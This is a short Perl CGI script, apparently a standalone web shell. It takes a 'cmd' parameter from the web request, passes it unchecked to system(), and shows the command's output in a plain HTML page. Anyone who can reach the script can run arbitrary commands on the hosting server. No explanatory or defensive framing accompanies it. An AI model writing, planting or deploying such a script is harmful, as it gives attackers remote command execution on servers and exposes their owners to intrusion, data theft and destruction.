#!/usr/bin/perl
print "Content-type:text/html\n\n";
use CGI;
$cgi=new CGI;
$cmd=$cgi->param("cmd");
print "<html><body bgcolor=lightgreen><center><b>";
print "Output of Unix Command is<br><br>";
system($cmd);
print "</b></center></body></html>";